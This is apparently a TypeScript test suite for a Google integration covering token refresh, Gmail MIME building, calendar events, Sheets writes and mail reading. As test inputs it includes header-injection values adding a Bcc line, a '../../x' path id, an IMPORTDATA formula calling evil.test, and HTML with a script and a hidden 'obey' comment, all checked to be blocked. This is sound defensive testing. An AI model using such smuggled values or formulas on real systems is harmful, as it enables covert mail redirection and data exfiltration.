import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  GoogleError,
  GoogleInputError,
  GoogleOutcomeUnknownError,
  GoogleTokens,
  REFRESH_MARGIN_MS,
  addrSpecs,
  appendSheet,
  buildMime,
  decodeWords,
  encodeHeaderText,
  eventFieldsVerdict,
  eventView,
  eventColorName,
  fetchUser,
  getGmailDraft,
  insertEvent,
  listEvents,
  mailFieldsVerdict,
  mailFingerprint,
  needsRefresh,
  parseAddress,
  parseGmailMessage,
  rawMessage,
  revokeToken,
  rowsVerdict,
  sendGmailMessage,
  MAX_BODY_CHARS,
  decodeEntities,
  htmlToText,
  mailMessageView,
  truncateBody,
  type FetchFn,
} from "../src/google.js";
import type { ConnectedAccount } from "../src/connected-accounts.js";
import { gmailPayloadFromMime } from "./fixtures/fake-gmail.js";

const NOW = Date.UTC(2026, 10, 13, 12);
const acct = (o: Partial<ConnectedAccount> = {}): ConnectedAccount => ({
  id: "g0000001", provider: "google", kind: "member", label: "ana@example.org", externalId: "sub-1", owner: "ana", connectedVia: "ana",
  share: { personal: true, groups: [], everyone: false, profiles: [] }, policy: "approve", policies: { mail: "approve", calendar: "approve", drive: "approve" },
  scopes: ["openid"], token: "ACCESS-OLD", refreshToken: "REFRESH-SECRET", expiresAt: NOW + 3600_000, createdAt: 1, updatedAt: 1, ...o,
});

/** A one-account store and a broker that counts its calls. */
function harness(account: ConnectedAccount, answer: () => Promise<Response> | Response) {
  let current = account;
  const calls: { url: string; body: string }[] = [];
  const fetchFn = (async (url: unknown, init?: { body?: unknown }) => {
    calls.push({ url: String(url), body: String(init?.body ?? "") });
    return answer();
  }) as FetchFn;
  const tokens = new GoogleTokens({
    broker: "https://broker.test",
    fetchFn,
    now: () => NOW,
    store: { get: (id) => (id === current.id ? current : undefined), patch: (_id, p) => void (current = { ...current, ...p }) },
  });
  return { tokens, calls, account: () => current };
}
const json = (status: number, body: unknown) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

// ---- access token --------------------------------------------------------

test("refresh: a token with more than 5 minutes left is used as is, no broker call", async () => {
  assert.equal(needsRefresh(acct({ expiresAt: NOW + REFRESH_MARGIN_MS }), NOW), false);
  assert.equal(needsRefresh(acct({ expiresAt: NOW + REFRESH_MARGIN_MS - 1 }), NOW), true);
  const h = harness(acct(), () => json(500, {}));
  assert.equal(await h.tokens.accessToken("g0000001"), "ACCESS-OLD");
  assert.equal(h.calls.length, 0);
});

test("refresh: under 5 minutes left → the broker is asked, the new token and expiry are stored, granted scopes are read from the answer", async () => {
  const h = harness(acct({ expiresAt: NOW + 60_000 }), () => json(200, { access_token: "ACCESS-NEW", expires_in: 3599, scope: "openid https://www.googleapis.com/auth/drive.file" }));
  assert.equal(await h.tokens.accessToken("g0000001"), "ACCESS-NEW");
  assert.equal(h.calls.length, 1);
  assert.equal(h.calls[0].url, "https://broker.test/google/refresh");
  assert.deepEqual(JSON.parse(h.calls[0].body), { refresh_token: "REFRESH-SECRET" });
  assert.equal(h.account().token, "ACCESS-NEW");
  assert.equal(h.account().expiresAt, NOW + 3599_000);
  assert.deepEqual(h.account().scopes, ["openid", "https://www.googleapis.com/auth/drive.file"]);
});

test("refresh: ONE in-flight refresh per account — callers that arrive meanwhile await the same one", async () => {
  let release!: (r: Response) => void;
  const h = harness(acct({ expiresAt: NOW - 1 }), () => new Promise<Response>((r) => (release = r)));
  const all = Promise.all([h.tokens.accessToken("g0000001"), h.tokens.accessToken("g0000001"), h.tokens.accessToken("g0000001")]);
  await new Promise((r) => setImmediate(r));
  assert.equal(h.calls.length, 1, "three callers, one broker call");
  release(json(200, { access_token: "ACCESS-NEW", expires_in: 3600 }));
  assert.deepEqual(await all, ["ACCESS-NEW", "ACCESS-NEW", "ACCESS-NEW"]);
  // The slot is freed: a later call uses the stored token without asking again.
  assert.equal(await h.tokens.accessToken("g0000001"), "ACCESS-NEW");
  assert.equal(h.calls.length, 1);
});

test("refresh: invalid_grant → the account is marked expired, the error says reconnect, and nobody asks again", async () => {
  const h = harness(acct({ expiresAt: NOW - 1 }), () => json(400, { error: "invalid_grant", status: 400 }));
  await assert.rejects(h.tokens.accessToken("g0000001"), (e: unknown) => e instanceof GoogleError && e.expired);
  assert.equal(h.account().status, "expired");
  await assert.rejects(h.tokens.accessToken("g0000001"), (e: unknown) => e instanceof GoogleError && e.expired);
  assert.equal(h.calls.length, 1, "an expired account never reaches the broker again");
});

test("refresh: a broker or Google outage is NOT a reconnect — the account stays usable", async () => {
  const down = harness(acct({ expiresAt: NOW - 1 }), () => json(502, { error: "unreachable" }));
  await assert.rejects(down.tokens.accessToken("g0000001"), (e: unknown) => e instanceof GoogleError && !e.expired && !/REFRESH-SECRET/.test(e.message));
  assert.equal(down.account().status, undefined);
  const thrown = harness(acct({ expiresAt: NOW - 1 }), () => { throw new Error("socket hang up REFRESH-SECRET"); });
  await assert.rejects(thrown.tokens.accessToken("g0000001"), (e: unknown) => e instanceof GoogleError && !e.expired && !/REFRESH-SECRET/.test(e.message));
});

test("refresh: an account with no refresh token, or one that is not Google's, is refused without a call", async () => {
  const h = harness(acct({ expiresAt: NOW - 1, refreshToken: undefined }), () => json(200, {}));
  await assert.rejects(h.tokens.accessToken("g0000001"), (e: unknown) => e instanceof GoogleError && e.expired);
  await assert.rejects(h.tokens.accessToken("nope"), GoogleError);
  assert.equal(h.calls.length, 0);
});

// ---- the MIME builder ----------------------------------------------------

const fields = (o: Record<string, unknown> = {}) => mailFieldsVerdict({ to: ["ana@example.org"], subject: "Hello", body: "Hi there", ...o });

test("mail fields: CR or LF in a subject or an address is refused — no second header through a field", () => {
  assert.throws(() => fields({ subject: "Hello\r\nBcc: eve@evil.test" }), GoogleInputError);
  assert.throws(() => fields({ subject: "Hello\nX-Injected: 1" }), GoogleInputError);
  assert.throws(() => fields({ to: ["ana@example.org\r\nBcc: eve@evil.test"] }), GoogleInputError);
  assert.throws(() => fields({ cc: ["Ana\n <ana@example.org>"] }), GoogleInputError);
  assert.throws(() => fields({ to: ["not an address"] }), /is not an email address/);
  assert.throws(() => fields({ to: [] }), /no recipient/);
  assert.throws(() => fields({ subject: "  " }), /no subject/);
  assert.throws(() => fields({ body: "" }), /empty/);
  assert.throws(() => fields({ to: "ana@example.org" }), GoogleInputError);
});

test("buildMime re-checks its input: a field that skipped the verdict still cannot inject a header", () => {
  const raw = { to: ["ana@example.org"], cc: [], bcc: [], subject: "x\r\nBcc: eve@evil.test", body: "b" };
  assert.throws(() => buildMime(raw), GoogleInputError);
  assert.throws(() => buildMime({ ...raw, subject: "x", to: ["a@b.co\r\nBcc: eve@evil.test"] }), GoogleInputError);
  assert.throws(() => buildMime({ ...raw, subject: "x" }, [{ name: "a\r\nX: 1.pdf", mime: "application/pdf", bytes: Buffer.from("x") }]), GoogleInputError);
});

test("buildMime: plain ASCII headers as written, the body base64 so no line of it reads as a header", () => {
  const mime = buildMime(fields({ cc: ["Bob Builder <bob@example.org>"], body: "Line one\r\nSubject: not a header\n.\n" }));
  const [head, body] = mime.split("\r\n\r\n");
  assert.match(head, /^To: ana@example\.org\r\nCc: "Bob Builder" <bob@example\.org>\r\nSubject: Hello\r\nMIME-Version: 1\.0\r\nContent-Type: text\/plain; charset="UTF-8"\r\nContent-Transfer-Encoding: base64$/);
  assert.doesNotMatch(head, /^From:/m, "Gmail sets From to the account");
  assert.equal(Buffer.from(body, "base64").toString("utf8"), "Line one\r\nSubject: not a header\n.\n");
});

test("RFC 2047: a non-ASCII subject and display name are encoded-words of at most 75 characters that decode back", () => {
  const subject = "Réunion d'équipe — compte rendu détaillé du troisième trimestre 🚀 et prochaines étapes à valider";
  const enc = encodeHeaderText(subject);
  for (const w of enc.split("\r\n ")) {
    assert.match(w, /^=\?UTF-8\?B\?[A-Za-z0-9+/=]+\?=$/);
    assert.ok(w.length <= 75, `encoded-word of ${w.length} chars`);
  }
  assert.equal(decodeWords(enc), subject);
  assert.equal(encodeHeaderText("Plain subject"), "Plain subject");
  assert.notEqual(encodeHeaderText("=?UTF-8?B?eA==?="), "=?UTF-8?B?eA==?=", "a literal that looks encoded is encoded, not passed through");
  const mime = buildMime(fields({ subject, to: ["Zoé Müller <zoe@example.org>"] }));
  assert.match(mime, /^To: =\?UTF-8\?B\?[^?]+\?= <zoe@example\.org>\r\n/);
  assert.doesNotMatch(mime.split("\r\n\r\n")[0], /[^\x00-\x7f]/, "headers are pure ASCII");
});

test("decodeWords reads Q-encoding and other charsets too (what Gmail may hand back)", () => {
  assert.equal(decodeWords("=?ISO-8859-1?Q?R=E9union_demain?="), "Réunion demain");
  assert.equal(decodeWords("=?UTF-8?B?w6k=?= =?UTF-8?B?w6g=?="), "éè");
  assert.equal(decodeWords("no encoding"), "no encoding");
});

test("addresses: a bare address or Name <addr>; a name with a comma survives as ONE recipient", () => {
  assert.deepEqual(parseAddress("ana@example.org"), { name: "", addr: "ana@example.org" });
  assert.deepEqual(parseAddress('"Doe, Jane" <jane@example.org>'), { name: "Doe, Jane", addr: "jane@example.org" });
  assert.equal(parseAddress("jane@"), null);
  assert.equal(parseAddress("<a@b.co> <c@d.co>"), null);
  const f = fields({ to: ["Doe, Jane <jane@example.org>", "bob@example.org"] });
  assert.deepEqual(f.to, ['"Doe, Jane" <jane@example.org>', "bob@example.org"]);
  assert.deepEqual(addrSpecs(f.to.join(", ")), ["jane@example.org", "bob@example.org"]);
});

test("attachments: multipart/mixed, names by RFC 2231 when not ASCII, bytes intact", () => {
  const pdf = Buffer.from([0, 1, 2, 250, 251, 252]);
  const mime = buildMime(fields(), [
    { name: "report.pdf", mime: "application/pdf", bytes: pdf },
    { name: "résumé.txt", mime: "text/plain", bytes: Buffer.from("x") },
  ], "BOUNDARY");
  assert.match(mime, /Content-Type: multipart\/mixed; boundary="BOUNDARY"/);
  assert.match(mime, /Content-Disposition: attachment; filename="report\.pdf"/);
  assert.match(mime, /Content-Disposition: attachment; filename\*=UTF-8''r%C3%A9sum%C3%A9\.txt/);
  assert.ok(mime.includes(pdf.toString("base64")));
  assert.ok(mime.trimEnd().endsWith("--BOUNDARY--"));
});

// ---- what Gmail says the draft is NOW ------------------------------------

test("round trip: the message we build, as Gmail hands it back, has the fingerprint of what the card showed", () => {
  const f = fields({ to: ["Zoé Müller <zoe@example.org>"], cc: ["bob@example.org"], subject: "Réunion — demain", body: "Bonjour,\n\nÀ demain.\n" });
  const at = [{ name: "plan.pdf", mime: "application/pdf", bytes: Buffer.from("%PDF") }];
  const shown = { ...f, attachments: ["plan.pdf"] };
  const back = parseGmailMessage(gmailPayloadFromMime(buildMime(f, at)));
  assert.deepEqual(back.attachments, ["plan.pdf"]);
  assert.equal(back.subject, "Réunion — demain");
  assert.equal(mailFingerprint(back), mailFingerprint(shown));
});

test("fingerprint: line endings and trailing blank lines do not count; a recipient, the subject, the body or an attachment do", () => {
  const base = { to: ["Ana <ana@example.org>"], cc: [], bcc: [], subject: "Hi", body: "one\ntwo", attachments: ["a.pdf"] };
  const fp = mailFingerprint(base);
  assert.equal(mailFingerprint({ ...base, body: "one\r\ntwo\r\n\r\n", to: ["ANA@example.org"] }), fp);
  assert.notEqual(mailFingerprint({ ...base, body: "one\ntwo!" }), fp);
  assert.notEqual(mailFingerprint({ ...base, subject: "Hi!" }), fp);
  assert.notEqual(mailFingerprint({ ...base, bcc: ["eve@example.org"] }), fp);
  assert.notEqual(mailFingerprint({ ...base, to: [...base.to, "bob@example.org"] }), fp);
  assert.notEqual(mailFingerprint({ ...base, attachments: [] }), fp);
});

test("parseGmailMessage: a draft Gmail rewrote as HTML only still yields its text", () => {
  const html = Buffer.from("<div>Hello<br>World &amp; co</div>").toString("base64url");
  const m = parseGmailMessage({ mimeType: "text/html", headers: [{ name: "To", value: "a@b.co" }, { name: "Subject", value: "S" }], body: { data: html } });
  assert.equal(m.body, "Hello\nWorld & co");
  assert.deepEqual(m.to, ["a@b.co"]);
});

// ---- API calls -----------------------------------------------------------

/** A fetch that records and answers from a script; the token must only be in Authorization. */
function recorder(answer: (url: string, init: RequestInit) => Response | Promise<Response>) {
  const seen: { url: string; init: RequestInit }[] = [];
  const fetchFn = (async (url: unknown, init?: RequestInit) => {
    seen.push({ url: String(url), init: init ?? {} });
    return answer(String(url), init ?? {});
  }) as FetchFn;
  return { fetchFn, seen };
}

test("a Google refusal becomes a sentence with Google's message and never the token; a 401 means reconnect", async () => {
  const r = recorder(() => json(403, { error: { code: 403, message: "Request had insufficient authentication scopes." } }));
  await assert.rejects(fetchUser("TOKEN-XYZ", r.fetchFn), (e: unknown) => {
    assert.ok(e instanceof GoogleError);
    assert.match(e.message, /Google profile lookup failed \(403\): Request had insufficient authentication scopes\./);
    assert.doesNotMatch(e.message, /TOKEN-XYZ/);
    return !e.expired;
  });
  assert.equal((r.seen[0].init.headers as Record<string, string>).Authorization, "Bearer TOKEN-XYZ");
  assert.doesNotMatch(r.seen[0].url, /TOKEN-XYZ/);
  const dead = recorder(() => json(401, { error: { message: "Invalid Credentials" } }));
  await assert.rejects(fetchUser("T", dead.fetchFn), (e: unknown) => e instanceof GoogleError && e.expired);
});

test("revoke: the token rides in the form body, never the URL; a failure is false, not a throw", async () => {
  const r = recorder(() => new Response("", { status: 200 }));
  assert.equal(await revokeToken("REFRESH-SECRET", r.fetchFn), true);
  assert.equal(r.seen[0].url, "https://oauth2.googleapis.com/revoke");
  assert.equal(r.seen[0].init.body, "token=REFRESH-SECRET");
  assert.equal(await revokeToken("x", (async () => { throw new Error("down"); }) as FetchFn), false);
});

test("a send that got no answer is 'outcome unknown', not a failure — it may have gone out", async () => {
  const lost = (async () => { throw new Error("socket hang up"); }) as FetchFn;
  await assert.rejects(sendGmailMessage("T", rawMessage("x"), lost), GoogleOutcomeUnknownError);
  await assert.rejects(insertEvent("T", "primary", { title: "x", start: "2026-11-20", end: "2026-11-21", attendees: [] }, lost), GoogleOutcomeUnknownError);
});

test("getGmailDraft: a 404 is 'gone' (null), not an error", async () => {
  assert.equal(await getGmailDraft("T", "r123", recorder(() => json(404, { error: { message: "Not Found" } })).fetchFn), null);
  await assert.rejects(getGmailDraft("T", "../../x", recorder(() => json(200, {})).fetchFn), GoogleInputError);
});

test("events: a time needs an offset or a zone; dates make an all-day event; attendees are mailed (sendUpdates=all)", async () => {
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20T10:00", end: "2026-11-20T11:00" }), /time zone/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "tomorrow", end: "2026-11-20T11:00Z" }), GoogleInputError);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20", end: "2026-11-20T11:00Z" }), /both/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20", end: "2026-11-21", timeZone: "Mars/Olympus" }), /time zone/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20", end: "2026-11-21", attendees: ["nope"] }), /email address/);
  assert.throws(() => eventFieldsVerdict({ start: "2026-11-20", end: "2026-11-21" }), /no title/);
  assert.throws(() => eventFieldsVerdict({}, true), /Nothing to change/);
  assert.throws(() => eventFieldsVerdict({ start: "2026-11-20" }, true), /both its start and its end/);
  assert.deepEqual(eventFieldsVerdict({ title: "Renamed" }, true), { title: "Renamed" });
  const r = recorder(() => json(200, { id: "ev1", summary: "Review", start: { dateTime: "2026-11-20T10:00:00+01:00", timeZone: "Europe/Paris" }, end: { dateTime: "2026-11-20T11:00:00+01:00" }, htmlLink: "https://calendar.google.com/e/1" }));
  const f = eventFieldsVerdict({ title: "Review", start: "2026-11-20T10:00", end: "2026-11-20T11:00", timeZone: "Europe/Paris", attendees: ["Bob <bob@example.org>"] });
  const e = await insertEvent("T", "primary", f as never, r.fetchFn);
  assert.equal(r.seen[0].url, "https://www.googleapis.com/calendar/v3/calendars/primary/events?sendUpdates=all");
  assert.deepEqual(JSON.parse(String(r.seen[0].init.body)), {
    summary: "Review",
    start: { dateTime: "2026-11-20T10:00:00", timeZone: "Europe/Paris" },
    end: { dateTime: "2026-11-20T11:00:00", timeZone: "Europe/Paris" },
    attendees: [{ email: "bob@example.org" }],
  });
  assert.equal(e.id, "ev1");
  assert.equal(e.link, "https://calendar.google.com/e/1");
});

test("calendar list: a default window of 7 days from now, an encoded calendar id, a refused bad date", async () => {
  const r = recorder(() => json(200, { items: [{ id: "a", summary: "All day", start: { date: "2026-11-20" }, end: { date: "2026-11-21" } }] }));
  const out = await listEvents("T", { calendarId: "team@group.calendar.google.com" }, r.fetchFn, NOW);
  const u = new URL(r.seen[0].url);
  assert.equal(u.pathname, "/calendar/v3/calendars/team%40group.calendar.google.com/events");
  assert.equal(u.searchParams.get("timeMin"), new Date(NOW).toISOString());
  assert.equal(u.searchParams.get("timeMax"), new Date(NOW + 7 * 24 * 3600_000).toISOString());
  assert.equal(out[0].allDay, true);
  await assert.rejects(listEvents("T", { from: "soon" }, r.fetchFn, NOW), GoogleInputError);
});

test("sheets: rows are plain cells written RAW — a formula an agent plants stays text", async () => {
  assert.throws(() => rowsVerdict([["a", { evil: 1 }]]), GoogleInputError);
  assert.throws(() => rowsVerdict("x"), GoogleInputError);
  const r = recorder(() => json(200, { updates: { updatedRange: "Sheet1!A1:B1" } }));
  await appendSheet("T", "sheet1", undefined, [["=IMPORTDATA(\"https://evil.test\")", 1]], r.fetchFn);
  assert.match(r.seen[0].url, /valueInputOption=RAW/);
});

// ---- the token stays where it is -----------------------------------------

test("neither Google module reads or writes the process environment: a token cannot reach an agent's env from here", () => {
  const src = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "src");
  for (const f of ["google.ts", "google-actions.ts", "connected-accounts.ts"]) {
    assert.doesNotMatch(fs.readFileSync(path.join(src, f), "utf8"), /process\.env/, `${f} touches process.env`);
  }
});

// ---- regressions from review ---------------------------------------------

test("an encoded display name holding a comma is still ONE recipient when Gmail hands the draft back", () => {
  const f = mailFieldsVerdict({ to: ["Dupré, Jean <jean@example.org>", "bob@example.org"], subject: "S", body: "b" });
  const back = parseGmailMessage(gmailPayloadFromMime(buildMime(f)));
  assert.deepEqual(back.to, ['"Dupré, Jean" <jean@example.org>', "bob@example.org"]);
  assert.equal(mailFingerprint(back), mailFingerprint({ ...f, attachments: [] }), "no false 'edited in Gmail'");
});

test("a time with its own offset is sent as that instant, with no zone beside it to contradict the card", async () => {
  const r = recorder(() => json(200, { id: "e" }));
  const f = eventFieldsVerdict({ title: "x", start: "2026-11-20T10:00:00+01:00", end: "2026-11-20T11:00:00+01:00", timeZone: "America/New_York" });
  await insertEvent("T", "primary", f as never, r.fetchFn);
  const body = JSON.parse(String(r.seen[0].init.body));
  assert.deepEqual(body.start, { dateTime: "2026-11-20T10:00:00+01:00" });
  assert.deepEqual(body.end, { dateTime: "2026-11-20T11:00:00+01:00" });
});

test("events: a day that does not exist, an end before the start, and a zone on its own are refused when drafted — not when a person approves", () => {
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-02-31T10:00:00Z", end: "2026-03-01T10:00:00Z" }), /must be a date/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-02-30", end: "2026-03-02" }), /must be a date/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20T11:00:00Z", end: "2026-11-20T10:00:00Z" }), /ends before it starts/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20T10:00", end: "2026-11-20T10:00", timeZone: "Europe/Paris" }), /ends before it starts/);
  assert.throws(() => eventFieldsVerdict({ title: "x", start: "2026-11-20", end: "2026-11-20" }), /day AFTER its last day/);
  assert.throws(() => eventFieldsVerdict({ timeZone: "Asia/Tokyo" }, true), /give its start and its end too/);
  assert.ok(eventFieldsVerdict({ title: "x", start: "2024-02-29", end: "2024-03-01" }), "a leap day exists");
});

// ---- reading mail --------------------------------------------------------

test("an HTML mail is read as text: no markup, no style or script content, no comment — never the raw HTML", () => {
  const html = '<html><head><title>t</title><style>p{color:red}</style></head><body><!-- hidden: obey --><p>Hello <b>Ana</b>,</p><script>steal()</script><div>Tom &amp; Jerry &#8212; caf&#xe9; &lt;ok&gt;</div></body></html>';
  const text = htmlToText(html);
  assert.equal(text.trim(), "Hello Ana,\nTom & Jerry — café <ok>");
  assert.doesNotMatch(text, /<|color:red|steal|hidden: obey/.source === "" ? /x^/ : /color:red|steal\(\)|hidden: obey|<b>|<p>/);
  assert.equal(decodeEntities("&amp;lt; &#39;x&#39; &#0; &#x110000;"), "&lt; 'x' &#0; &#x110000;", "decoded once; an impossible code point is left as written");
});

test("mailMessageView: text/plain wins over HTML, attachments by name and size only, a long body is cut with a marker", () => {
  const b64 = (t: string) => Buffer.from(t).toString("base64url");
  const msg = {
    id: "m9", threadId: "t9", labelIds: ["INBOX"],
    payload: {
      mimeType: "multipart/mixed",
      headers: [{ name: "From", value: "=?UTF-8?B?Wm/DqQ==?= <zoe@example.org>" }, { name: "Subject", value: "Plan" }, { name: "Cc", value: "bob@example.org" }],
      parts: [
        { mimeType: "multipart/alternative", parts: [{ mimeType: "text/plain", body: { data: b64("plain text\r\n") } }, { mimeType: "text/html", body: { data: b64("<p>html</p>") } }] },
        { mimeType: "application/pdf", filename: "plan.pdf", body: { size: 2048 } },
      ],
    },
  };
  const v = mailMessageView(msg);
  assert.equal(v.from, "Zoé <zoe@example.org>");
  assert.equal(v.cc, "bob@example.org");
  assert.equal(v.body, "plain text");
  assert.deepEqual(v.attachments, [{ name: "plan.pdf", size: 2048 }]);
  assert.equal(v.unread, false);
  assert.equal("data" in (v.attachments[0] as object), false, "no attachment content");
  const htmlOnly = mailMessageView({ payload: { mimeType: "text/html", body: { data: b64("<div>only <i>html</i></div>") } } });
  assert.equal(htmlOnly.body, "only html");
  const long = truncateBody("é".repeat(MAX_BODY_CHARS + 7));
  assert.equal(long.truncated, true);
  assert.ok(long.body.endsWith("\n[… truncated: 7 more characters not shown]"));
  assert.deepEqual(truncateBody("short"), { body: "short", truncated: false });
});

test("event colour: Google's colorId is named, an event without one takes its calendar's colour", () => {
  assert.equal(eventColorName("11"), "Tomato");
  assert.equal(eventColorName("1"), "Lavender");
  assert.equal(eventColorName("12"), undefined);
  assert.equal(eventColorName(undefined), undefined);
  assert.equal(eventView({ id: "e", summary: "x", colorId: "2", start: { date: "2026-11-20" }, end: { date: "2026-11-21" } }).color, "Sage");
  assert.equal(eventView({ id: "e", summary: "x", start: { date: "2026-11-20" }, end: { date: "2026-11-21" } }).color, "default");
});

test("event colour: written by name (any case) or number, 'default' clears it, anything else is refused", () => {
  assert.deepEqual(eventFieldsVerdict({ color: "tomato" }, true), { color: "Tomato" });
  assert.deepEqual(eventFieldsVerdict({ color: "9" }, true), { color: "Blueberry" });
  assert.deepEqual(eventFieldsVerdict({ color: "Default" }, true), { color: "default" });
  assert.throws(() => eventFieldsVerdict({ color: "mauve" }, true), /not an event colour/);
});
